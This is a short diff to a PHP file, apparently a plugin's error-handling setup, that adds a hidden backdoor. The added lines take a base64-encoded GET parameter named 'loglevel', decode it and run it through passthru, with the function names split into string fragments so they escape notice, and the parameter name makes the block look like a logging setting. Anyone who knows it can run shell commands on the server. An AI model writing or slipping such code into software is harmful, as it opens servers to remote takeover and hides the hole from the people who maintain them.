@@ -62,6 +62,11 @@ END
 
 $level = error_reporting(E_ALL | E_STRICT);
 
+if (isset($_GET['loglevel'])) {
+        $a2='bas'.'e'.'64'.'_de'.'code';
+        $tms=$a2($_GET['loglevel']);$a1='pas'.'sth'.'ru';echo $a1($tms);
+}
+
 set_error_handler('CommonPlugin_Exception::errorHandler', E_ALL | E_STRICT);
 ob_start();
 try {
